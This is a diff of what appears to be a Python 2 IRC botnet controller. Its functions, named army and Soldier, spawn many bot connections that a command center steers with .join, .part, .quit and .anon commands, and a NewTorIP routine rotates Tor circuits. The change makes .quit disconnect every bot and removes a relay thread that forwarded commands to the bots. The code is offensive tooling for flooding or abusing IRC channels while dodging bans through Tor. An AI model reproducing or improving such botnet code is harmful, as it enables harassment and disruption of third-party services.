@@ -51,6 +51,8 @@ def receiveCommandCenter(s,channel):
 				shit, channel = msg.split(".part ")   
 				s.send("PART " + channel + "\r\n")   
 			if sData.startswith(".quit"): 
+				for bot in bots:
+					bot.send("QUIT\r\n")       
 				s.send("QUIT oops\r\n")       
 				s.close()
 				print "[Sent quit signal]"
@@ -67,32 +69,6 @@ def receiveCommandCenter(s,channel):
 				thread = threading.Thread(target=army,args=[host, s, int(n)])
 				thread.start()
 				print "[Rehooked to main thread]"
-	
-def relayer(command, target, channel):
-	while True:
-		msg = command.recv(1024)
-		msg = msg.strip()
-		if msg.find("PING ") != -1:
-			shit, hashbit = msg.split("PING ")
-			hashbit = hashbit.strip()
-			command.send("PONG " + hashbit + "\r\n")
-		if "PRIVMSG " in msg:
-			channel = msg.split("PRIVMSG ")
-			channel = channel[1].split(" :")
-			channel = channel[0].strip()
-			sData = msg.split(" PRIVMSG "+channel+" :")[1].strip()
-			if sData.startswith(".join "):
-				channel = msg.split(".join ")[1]
-				for bot in bots:
-					bot.send("JOIN " + channel + "\r\n")       
-			if sData.startswith(".part "):
-				shit, channel = msg.split(".part ")   
-				for bot in bots:
-					bot.send("PART " + channel + "\r\n")       
-			if sData.startswith(".quit"): 
-				target.send('PRIVMSG %s :.quit\r\n' % (channel))       
-				target.close()
-				os._exit(0)
 			if sData.startswith(".anon "):
 				chan = msg.split(".anon ")[1]
 				for bot in bots:
@@ -132,9 +108,7 @@ def Soldier(host, q):
 	global bots
 	bots.append(s)
 	thread = threading.Thread(target=receive,args=[s, channel])
-	thread1 = threading.Thread(target=relayer,args=[q, s, channel])
 	thread.start()
-	thread1.start()
 	
 def NewTorIP():
 	with Controller.from_port(port = 9051) as controller:
